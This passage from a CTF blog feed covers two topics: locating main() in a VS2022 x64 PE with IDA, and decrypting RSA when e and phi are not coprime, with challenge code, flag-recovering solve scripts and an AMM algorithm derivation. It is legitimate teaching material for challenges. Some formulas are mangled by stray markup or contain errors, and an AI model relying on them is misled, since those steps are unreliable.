Database</code>（程序数据库），它包含了调试信息，包括变量名、函数名、行号等信息。</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811140606696.png" alt="image-20250811140606696"></p><ul><li>这时我们使用<code>Ida</code>对<code>Realme.exe</code>文件进行逆向，在逆向的时候我们会出现一个这样的提示，其实就是<code>Realme.exe</code>文件连接了一个调试信息和符号表在<code>Realme.pdb</code>中，我们是否要加载这个符号表，这里我们先选择<code>Yes</code></li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811140915727.png" alt="image-20250811140915727"></p><ul><li>等<code>Ida</code>反编译完后直接在<code>Functions</code>那一栏搜索<code>main</code>，操作下来会很快的确定到<code>main</code>函数，这相当的轻松。</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811141219078.png" alt="image-20250811141219078"></p><ul><li>此时我们关掉这个<code>ida</code>界面，对该程序重新逆向，遇到这个选项的时候选择<code>No</code></li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811141317418.png" alt="image-20250811141317418"></p><ul><li><code>Ida</code>反编译好该文件后继续搜索<code>main</code>函数，发现并没有搜索到<code>main</code>函数</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811141415646.png" alt="image-20250811141415646"></p><ul><li>这时因为程序没有加载<code>.pdb</code>文件，所以<code>IDA</code>在逆向的时候没有对应的符号表，而在真实的环境中，程序都是又多、又没有符号表。在这种情况下就需要先定位到<code>main</code>函数才能开始逆向分析。对于找到<code>main</code>函数，其实我们就需要从<code>EP程序入口点</code>入手。</li><li>程序入口点在收集程序信息的时候就已经知道了，并且<code>IDA</code>中对程序入口点的函数都会使用<code>start</code>名称，搜索一下函数名称就可以看到（可以多试几个程序，看看这些程序的<code>start</code>函数）</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811141909123.png" alt="image-20250811141909123"></p><ul><li>接下来就以<code>vs2022</code>编译的<code>x64 debug</code>的这个<code>realme.exe</code>文件在有符号表的情况下进行分析，看看这个程序从<code>start</code>到<code>main</code>会执行哪些步骤。</li><li>首先可以查壳看看该程序的的<code>EP</code></li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811143755880.png" alt="image-20250811143755880"></p><ul><li>接下来在<code>IDA</code>中找到<code>EP</code>也就是对应的<code>start</code>函数，此时发现这个<code>start</code>函数会<code>jmp</code>到<code>mainCRTStartup</code>这个函数中去，这个函数的全称为<code>main CRT Startup</code>，<code>CRT C Runtime Library</code></li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811143706011.png" alt="image-20250811143706011"></p><ul><li>这时跟进这个函数看看，发现这个函数中会<code>call</code>一个函数，一个名为<code>__scrt_common_main</code>这个函数，接下来继续跟进</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811144020190.png" alt="image-20250811144020190"></p><ul><li>发现<code>__scrt_common_main</code>会<code>call</code>俩个函数，这时会注意到第二个函数与<code>main</code>函数有关系，所以跟进到<code>__scrt_common_main_seh</code>这个函数中，进行分析。</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811144204988.png" alt="image-20250811144204988"></p><ul><li>进入到<code>__scrt_common_main_seh</code>会发现这是一个比较复杂的函数</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811144558042.png" alt="image-20250811144558042"></p><ul><li>这个时候定位到函数块结束前面一点的位置，会看到这个函数会调用<code>invoke_main</code>跟进到这个函数中去</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811144632550.png" alt="image-20250811144632550"></p><ul><li>进入到这个函数中去就会发现有一个<code>j_main</code>，跟进<code>j_main</code></li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811144728913.png" alt="image-20250811144728913"></p><ul><li>发现<code>j_main</code>这个函数会执行<code>jmp main</code>，而<code>jmp main</code>中<code>jmp</code>到的位置其实就是<code>main</code>函数的位置</li></ul><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811144748447.png" alt="image-20250811144748447"></p><p><img src="/2025/08/10/CTFblog/REVERSE%E7%B3%BB%E5%88%97blog/Windows%E9%80%86%E5%90%91/PE%E9%80%86%E5%90%91%E5%AE%9A%E4%BD%8Dmain%E5%87%BD%E6%95%B0/image-20250811144852445.png" alt="image-20250811144852445"></p><ul><li>所以在<code>start</code>到<code>main</code>之间<code>vs2022</code>编译的<code>x64</code>程序执行的流程是这样的：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">start</span><br><span class="line">-&gt;mainCRTStartup</span><br><span class="line">-&gt;_scrt_common_main</span><br><span class="line">-&gt;__scrt_common_main_seh</span><br><span class="line">.....</span><br><span class="line">-&gt;invoke_main</span><br><span class="line">    .....</span><br><span class="line">-&gt;j_main</span><br><span class="line">-&gt;main</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><h2 id="windbg调试">windbg调试</h2><h2 id="定位main函数的方法">定位main函数的方法</h2><ul><li><p>通过上面的分享，这时如果遇到一个<code>vs2022</code>编译的<code>x64</code>版本的<code>exe</code>程序尽管它没有符号表，我们也能比较快速的找到<code>main</code>函数。但是其他开发环境编译的程序<code>start-&gt;main</code>是否也是这样的流程呢？答案是其他开发环境编译的程序可能并不是这样的流程，主要有以下几点：</p><ul><li>不同编译器，编译后的<code>exe</code>程序<code>start-&gt;main</code>函数之间执行的程序是不同的。</li><li>相同编译器但是版本不同，编译后的<code>exe</code>程序<code>start-&gt;main</code>函数之间执行的程序也是不同的。</li></ul></li><li><p>因为编译器的原因<code>start-&gt;main</code>之间执行的程序逻辑并不相同，这样我们并不能学习一个<code>vs2022 x64</code>编译的程序<code>start-&gt;main</code>之间的过程就一劳永逸，还需要一些其他的方法来确定main函数的地址，这里介绍几个方法。</p><ul><li>方法一：收集到逆向的目标程序编译环境（包括开发环境、编译器版本等）信息后，在本地配置一个相同或者差不多的环境（比如都使用<code>vs2022</code>）使用该开发环境编写一个简单的程序并带有符号表编译，通过调试这个简单的程序熟悉<code>start-&gt;main</code>之间的程序流程，这样逆向目标程序就很容易找到<code>main</code>函数了。</li><li>方法二：字符串搜索法</li><li>方法三：动态调试，调试call到相应函数时程序会触发一些行为，或者在调试器中看到一些字符串即可确定函数。</li><li>方法四：API检索法在调用代码中设置断点、在API代码中设置断点。</li><li>方法五：寻找<code>exit</code>函数，寻找exit函数的参数从哪里来，一般来说exit函数的参数是main的返回值。</li></ul></li><li><p>对于方法一，一种就是现学，另一种就是平时的积累，没什么好说的，在文章后面会对各个编译器和开发环境下编译的<code>exe</code>文件从<code>start-&gt;main</code>的这一过程进行分析并积累起来。接下来重点介绍一下方法<code>二、三、四</code></p></li></ul><p>注意：对于方法<code>二、三、四</code>其实也适用于定位其他关键函数。</p><h2 id="方法二">方法二</h2><h2 id="方法三">方法三</h2><h2 id="方法四">方法四</h2><h1 id="visual_studio2022_start分析">Visual_studio2022_start分析</h1><h2 id="x64">x64</h2><h2 id="x32">x32</h2>]]></content>
    
    
    <summary type="html">怎么感觉逆向入门要比PWN难???</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="REVERSE" scheme="http://iyheart.github.io/categories/CTF/REVERSE/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA加密之e和phi不互素</title>
    <link href="http://iyheart.github.io/2025/08/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8Be%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0/"/>
    <id>http://iyheart.github.io/2025/08/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8Be%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0/</id>
    <published>2025-08-08T15:44:47.000Z</published>
    <updated>2025-08-12T14:11:32.401Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>参考博客：<a href="https://www.cnblogs.com/SevensNight/p/18764988">e与(p-1)或(q-1)均不互素 - sevensnight - 博客园</a></p></li><li><p>参考视频：<a href="https://www.bilibili.com/video/BV11B421k7Jh?vd_source=bbdaef564df94fc8991902ba22c6761b">b站视频DoraHacks_e_phi不互素</a></p></li><li><p>由于该题型涉及到<code>AMM</code>算法所以还是比较迟才整理的。虽然网上有现成的代码，但是为了做题而抄代码这学不到东西（赛后也会因为缺少数论基础而不会去理解算法原理）。</p></li><li><p>这样下面这一张图是本篇文章的主要脉络：</p></li></ul><p><img src="/2025/08/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8Be%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0/image-20250809124458151.png" alt="image-20250809124458151"></p><h1 id="前言">前言</h1><ul><li>对于之前做过的一些<code>RSA</code>加密，求出$\phi(N)$后就离解出密文非常近了，最关键一步其实就是求私钥$d$也就是$d \equiv e^{-1}~mod~(\phi(n))$，也就是求e在模$\phi(n)$下的逆元。但是回顾一下数论知识就会发现在求e的逆元时首先逆元需要存在才能求得密文，而密文存在的条件是$gcd(\phi(n),e)=1$，即二者互素。</li><li>当$gcd(\phi(n),e)≠1$，也就是二者不互素的情况下，就不能使用求逆元的方法求得私钥$d$，这就导致没办法正常的解密，此时就需要使用其他的方法进行处理，核心的方法是<code>AMM</code>算法。当然有些时候$gcd(\phi(n),e)$比较小的时候会有更好的解决方法。</li></ul><h1 id="情况1gcdephi比较小">情况1—gcd(e,phi)比较小</h1><h2 id="推导">推导</h2><ul><li><p>对于$gcd(e,\phi(n))$比较小的情况，这里有个疑问，到底怎么样才算是比较小呢？总需要有一个界限吧。这个先不急着知道，看完该情况处理方式的推导过程之后，其实就会明白了（当然到文章后面我也会说明）。</p></li><li><p>对于$gcd(e,\phi(n))$比较小的情况，不妨设$gcd(e,\phi(n))=t$，则有$e’=e//t$。那么就有如下推导：</p></li></ul><p>$$<br>\begin{array}{l}<br>c \equiv m^e \equiv m^{e’t}~mod(~n)\<br>d’ = e’^{-1}~mod(~\phi(n))\<br>\Rightarrow c^{d’} \equiv m^{te’d’}~mod(~\phi(n))\<br>\Rightarrowc^{d’} \equiv m^{t*1}~mod(~\phi(n))\<br>\Rightarrow c^{d’} \equiv m^t ~mod(~\phi(n))<br>\end{array}<br>$$</p><ul><li>通过如上推导其实就相当于对$m^e$进行了一个降幂的操作，将$m^e$降成了$m^t$。虽然这样求的并不是明文的原始数据，但是当$m^t &lt; n$的时候，这其实就有$c^{d’}~mod(~n) = m^t$，因为$m^t$的实际值是小于n的，这样就可以得到真正的$m^t$的值，这样直接开根号就可以求得$m$即明文</li><li>所以上面所说的<strong>比较小</strong>的这个界限，其实就是根据$m^t$与<strong>n</strong>的大小相比较的情况。</li></ul><h2 id="例题">例题</h2><ul><li>题目来源：NSSCTF忘记具体哪题了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span>*<span class="number">2</span></span><br><span class="line">n = p*q </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 9927950299160071928293508814174740578824022211226572614475267385787727188317224760986347883270504573953862618573051241506246884352854313099453586586022059</span></span><br><span class="line"><span class="string">q = 9606476151905841036013578452822151891782938033700390347379468858357928877640534612459734825681004415976431665670102068256547092636766287603818164456689343</span></span><br><span class="line"><span class="string">e = 131074</span></span><br><span class="line"><span class="string">c = 68145285629092005589126591120307889109483909395989426479108244531402455690717006058397784318664114589567149811644664654952286387794458474073250495807456996723468838094551501146672038892183058042546944692051403972876692350946611736455784779361761930869993818138259781995078436790236277196516800834433299672560</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>解析如下：</p><ul><li>这题其实<code>p、q、n、e、c</code>都给了，先直接按照常规解密流程走走看，发现代码运行到<code>d = gmpy2.invert(e,phi)</code>会报错，报错内容是逆元不存在。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><ul><li>既然逆元不存在的话，那其实就是<code>gcd(e,phi)!=1</code>。那就先来看看<code>e和phi的最大公因素</code>，发现最大公因素是<code>2</code>，算是比较小的</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(gmpy2.gcd(e,phi))</span><br><span class="line"><span class="comment"># 2</span></span><br></pre></td></tr></table></figure><ul><li>这时已经知道了<code>gcd(e,phi)=2</code>，那我们就尝试一下直接开方是否能解出<code>flag</code>。通过推导的过程得到$m^2$后直接开方，发现可以直接求得<code>flag</code>，那这题就算是完成了。exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = <span class="number">131074</span></span><br><span class="line">c = </span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">t = gmpy2.gcd(e,phi)</span><br><span class="line">e_ = e//t</span><br><span class="line">d_ = gmpy2.invert(e_,phi)</span><br><span class="line">m_ = <span class="built_in">pow</span>(c,d_,n)</span><br><span class="line">m,x = gmpy2.iroot(m_,t)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;inverse_and_root&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="情况2e和p-1或q-1互素">情况2—e和(p-1)或(q-1)互素</h1><h2 id="推导">推导</h2><ul><li><p>这种情况是<code>e</code>和$phi(n)$并不互素，但是<code>e</code>和<code>p-1或q-1</code>其中一个互素，这种情况也不需要使用<code>AMM</code>算法来求解。这里我们可以根据数论同余定理：若$m=p_1*p_2$，且$a\equiv b(~mod~m)$，则有$a\equiv b~(mod ~p_1)$和$a\equiv b~(mod~p_2)$</p></li><li><p>由于情况2是<code>e和(p-1)、(q-1)其一互素</code>，那就不妨设$gcd(e,p-1)=1$，也就是$e^{-1}~mod~(\phi(p))$存在</p></li><li><p>这时对于情况2，就有如下推导：</p></li></ul><p>$$<br>\begin{array}{l}<br>n=p<em>q,c\equiv m^e~(mod~n)\<br>\Rightarrow c\equiv m^e~(mod~p)\<br>gcd(e,p-1)=1 \<br>\Rightarrow d’\equiv e~mod(~\phi(p))\<br>\Rightarrow m \equiv m^{e</em>d’}~mod(~p)<br>\end{array}<br>$$</p><ul><li><p>通过以上推导其实可以比较轻松的求出明文<code>m</code>。注意：这种条件下也有一个限制条件就是明文<code>m</code>必须小于<code>p</code>，或者不能远大于<code>p</code>，否则在计算$m \equiv m^{e*d’}~mod(~p)$时，没有办法还原出真正的<code>m</code>。</p></li><li><p>所以情况2本质上是转换为这种形式的<code>RSA</code>加密从而去解密：</p></li></ul><p>$$<br>m^e \equiv c(~mod~p)\<br>m^e \equiv c(~mod~q)<br>$$</p><h2 id="例题">例题</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">65537</span> * <span class="number">3</span> * <span class="number">5</span> * <span class="number">7</span> * <span class="number">9</span></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">t = gmpy2.gcd(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="keyword">assert</span> m**t &gt; n</span><br><span class="line"><span class="keyword">assert</span> gmpy2.gcd(e,p-<span class="number">1</span>) == <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>,e)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 3337182590619332891367579450095260017621948297658608474765927585747734506999354328509683568925377515619204064576076990658487700251069936667303178625246768854069321364684053609635568733663779323983023955186264359508474160621887429553760676977134496070475993741436565049779300934693925938183415460792275981347122871322148183170843853299782459185390522709695133592628923912979653573313450679119054746286193009565269774894288416510194737513999402051586939745106744803143145962870026162701796980802087523932796322787192289532828027946970149619523331107916885023397981791618926415589540736035561888254541222060699696856314</span></span><br><span class="line"><span class="string">p = 159938356510922739007311592848401509267166900696359028060364191269434588150823128062554654793663223011556473183265872894887579647809204570681388595087731937155662030332723972658713288321275408537705376086753101569069606146533249314025914677902624686308192979454352019032737737659516168971489486159303628756323</span></span><br><span class="line"><span class="string">q = 96430824217229072069182669895140083481416631653486517954264036040832169030441397642841245167011632195729479683858486548460196751092827654037479770105468583618722386613888439003723062136646644840030371564874711263303175809941599945731077671059902934814813625011920226998576747817059406799637645523370079620639</span></span><br><span class="line"><span class="string">e = 61932465</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>这题代码<code>assert gmpy2.gcd(e,p-1) == 1</code>已经告诉我们是<code>e与p-1互素</code>，并且此题也断言了<code>m**t &gt; n</code>，这就导致我们并不能使用情况1的解法。就需要使用情况2推导的方法，exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = <span class="number">61932465</span></span><br><span class="line">c = c % p</span><br><span class="line">phi = p-<span class="number">1</span></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;1858c133-a706-4110-af96-9639b25a3d5f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="情况3p-1或q-1是e的倍数">情况3—(p-1)或(q-1)是e的倍数</h1><ul><li><p>情况3的解法会比前俩种情况复杂的多，这种情况一般是<code>gcd(e,phi)=e</code>或者是<code>gcd(e,phi)=k*e</code>，在解决此情况的时候需要使用到一个算法，这个算法为<code>AMM</code>算法，也就是</p></li><li><p>在学习<code>AMM</code>算法之前需要先掌握几个定理和概念：</p><ul><li>二次剩余与二次非剩余</li><li>欧拉判别法</li><li>勒让德符号</li></ul></li></ul><h2 id="amm算法">AMM算法</h2><ul><li><p><code>AMM</code>算法全称是<strong>AMM(全称为Adleman-Mander-Miller Method)</strong>，<code>AMM</code>算法与<code>Tonelli-Shanks</code>算法本质上是一样的，只不过乘积的时候顺序不同。</p></li><li><p>首先提出<code>AMM</code>算法是在<code>1977</code>年，由<code>Adleman, Manders, Miller</code>发表于<code>IEEE FOCS</code>会议的一篇名为<code>On taking roots in finite fields</code></p></li><li><p>但是真正让<code>AMM</code>算法被重视的其实是在<code>2011</code>年，由<code>Zhengjun Cao, Qian Sha, Xiao Fan</code>发表的名为<code>Adleman–Manders–Miller Root Extraction Method Revisited</code>这篇论文，所以学习AMM算法主要参考的就是这篇论文，论文地址：<a href="https://arxiv.org/pdf/1111.4877">1111.4877v1.pdf</a></p></li><li><p>在论文中有介绍三种<code>AMM</code>算法：分别是<code>二次同余方程</code>的AMM算法，以及扩域后的<code>二次同余方程</code>的AMM算法，最后就是<code>r次同余方程</code>的AMM算法。这边我只学习<code>二次同余方程</code>的AMM算法和<code>r次同余方程</code>的AMM算法。</p></li><li><p><code>AMM</code>算法的作用其实是快速求解同余方程$x^2\equiv a~(~mod~p)$，其中<code>p</code>是素数。</p></li></ul><p><strong>问题</strong>：</p><p>求解二次同余方程$x^2 \equiv \delta~(mod~p)$，其中<code>p</code>是奇素数。</p><p><strong>算法推导</strong>：</p><ul><li>首先我们先将<code>p-1</code>（也就是奇素数p的欧拉函数），写成$2^t*s$的形式，其中需要满足<code>s</code>是一个奇数。这样对于一个模p下的二次剩余$\delta$和模p下的二次非剩余$\rho$来说有如下的式子$(\delta^s)^{2^{t}}~mod(~p)$和式子$(\rho^{s})^{2^{t}}~mod~(p)$由欧拉判别可以得到：</li></ul><p>$$<br>(\delta^s)^{2^{t-1}}\equiv 1~mod(~p),(\rho^{s})^{2^{t-1}}\equiv -1~mod~(p)<br>$$</p><ul><li>当$t=1$的时候其实就有下式，即由上式左边的同余式同余号两边同乘$\delta$即可得到：</li></ul><p>$$<br>(\delta^{\frac{s+1}{2}})^2 \equiv \delta~mod(~p)<br>$$</p><ul><li>当$t≥2$的时候，就会有$(\delta^s)^{2^{t-2}}~mod(~p)\in{1,-1}$，此时就可以找到一个$k_1=0 ~or~1$使得：</li></ul><p>$$<br>(\delta^s)^{2^{t-2}}*(\rho^s)^{2^{t-1}*k_1}\equiv1~mod(~p)<br>$$</p><ul><li>对于$(\delta^s)^{2^{t-3}}$也有$(\delta^s)^{2^{t-3}}~mod(~p)\in{1,-1}$，此时也可以找到一个$k_2=0~or~1$使得：</li></ul><p>$$<br>(\delta^s)^{2^{t-3}}*(\rho^s)^{2^{t-1}*k_2}\equiv1~mod(~p)<br>$$</p><ul><li>这样就可以找到$k_1,k_2,…,k_{t-1}\in{0,1}$，使得：</li></ul><p>$$<br>(\delta^s)(\rho^s)^{2<em>k_1+2^2</em>k_2+…+2^{t-1}*k_{t-1}}\equiv1~(mod~p)<br>$$</p><ul><li>最终我们就可以找到同余方程$x^2 \equiv \delta~(mod~p)$的根即：</li></ul><p>$$<br>(\delta^{\frac{s+1}{2}})^2((\rho^s)^{k_1+2*k_2+…+2^{t-2}*k_{t-1}})^2 \equiv \delta~(mod~p)<br>$$</p><ul><li><p>而这个程序运行的时间复杂度为$O(log^3p+t^2log^2p)$。</p></li><li><p>下面这张图片就是<code>AMM</code>算法在有限域$F_p$下的求平方根的伪代码：</p></li></ul><p><img src="/2025/08/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8Be%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0/image-20250809180442472.png" alt="image-20250809180442472"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 